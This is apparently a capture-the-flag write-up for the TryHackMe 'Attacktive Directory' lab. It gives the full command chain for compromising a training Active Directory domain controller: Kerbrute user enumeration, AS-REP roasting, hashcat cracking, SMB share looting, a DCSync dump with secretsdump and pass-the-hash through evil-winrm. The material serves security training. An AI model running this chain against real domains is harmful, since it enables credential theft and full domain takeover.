# Attacktive Directory

**Platform:** TryHackMe
**Category:** Active Directory
**Difficulty:** Easy
<br>

**Challenge Description**
<br><br>
<img width="1376" height="301" alt="image" src="https://github.com/user-attachments/assets/bb37d26f-4d2e-4e7d-892c-10fb3112fd86" />

## Overview
This room focuses on security misconfigurations in Active Directory. These include improper permissions, weak password policy and sensitive information stored in SMB shares. We need to find three flags: we will retrieve the first two via RDP, and the last one—the Administrator flag—using Evil-WinRM.
<br>

## Enumeration

### Port Discovery with Nmap
Syntax:

```bash
nmap -p- -T4 -sV $IP -oN port_scan.txt
```
<br>
The combination of ports (Kerberos 88, LDAP 389, SMB 445) strongly suggests that the target is a Domain Controller

```text
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-31 11:17:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
```

<br>

### enum4linux-ng

Continuing with our enumeration phase, I will use `enum4linux-ng` to (potentially) discover a great deal of useful information.

Syntax:
```bash
enum4linux-ng -A $IP
```

The enumeration revealed that the Active Directory domain is
`spookysec.local`, with `THM-AD` being the NetBIOS domain name.
### Username enumeration with Kerbrute

The room provides wordlists that can be used during the enumeration and credential attacks. I will start by identifying the users using `Kerbrute`.
<br><br>
You can download the tool from <a href="https://github.com/ropnop/kerbrute">here</a>
<br><br>
In the syntax, I need to specify the domain controller's IP address, the domain name, and the file containing the usernames.

Syntax:
```bash
kerbrute userenum --dc $IP -d $DOMAIN users.txt 
```

I have identified two interesting users: svc-admin and backup.

### AS-REP Roasting
Kerbrute has already identified the account configured without Kerberos pre-authentication, but for the sake of learning, I will retrieve the hash using another tool: `impacket-GetNPUsers`.

<br>

For more information about AS-REP roasting, you can read  <a href="https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/asreproast">this</a> post

<br>

Save the interesting usernames to a file and use the following command:

```bash
impacket-GetNPUsers THM-AD/ -dc-ip $IP -userfile ASREPRoasting -format hashcat -outputfile hashes.txt -no-pass
```

<img width="1905" height="93" alt="image" src="https://github.com/user-attachments/assets/e05543aa-9de9-4dc3-a083-b5044a45baf8" />

## Exploitation

### Cracking svc-admin password hash

The hashcat mode is 18200 (Kerberos 5, etype 23, AS-REP).

Syntax:

```bash
hashcat -m 18200 hashes.txt /path/to/rockyou.txt
```

<img width="1913" height="84" alt="image" src="https://github.com/user-attachments/assets/ceab6a58-88c5-44f2-b6b7-8c70721127ee" />
<br>
After obtaining the password, you can connect via RDP and retrieve the flag.

### SMB share enumeration as svc-admin

I will list the SMB shares accessible to the svc-admin user:

```bash
smbclient -L //$IP/ -U 'svc-admin' --password=REDACTED
```

<br>

```text
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share
```
<br>
The only interesting share is 'backup', which contains a file with a base64-encoded string

<img width="1275" height="326" alt="image" src="https://github.com/user-attachments/assets/16122edc-977e-451b-8ff0-b3d89be2c7f9" />

I will decode it in the terminal, piping the output of the file in `base64 -d`

<img width="570" height="83" alt="image" src="https://github.com/user-attachments/assets/2768d21c-e94b-493e-8df0-80145a154653" />

### backup -> Administrator

The backup account had sufficient Active Directory privileges to perform a DCSync credential dump. With `impacket-secretsdump` I was able to retreive NTLM hashes from the Domain Controller

Syntax:
```bash
impacket-secretsdump 'THM-AD/backup:REDACTED@$IP'
```

From this, we obtained the Administrator's hash, which allows us to perform a "pass-the-hash" attack.

Evil-WinRM syntax:

```bash
evil-winrm -i $IP -u Administrator -H REDACTED_NTHASH
```
<img width="1286" height="266" alt="image" src="https://github.com/user-attachments/assets/5a877671-0a0e-4979-8154-45d45bdd77eb" />

## Lesson Learned

<ul>
  <li>Determine from nmap whether you are dealing with Active Directory.</li>
  <li>Enumerate every service: SMB, LDAP, RPC, Kerberos</li>
  <li>When dealing with Active Directory, your priority should be a set of credentials.</li>
</ul>
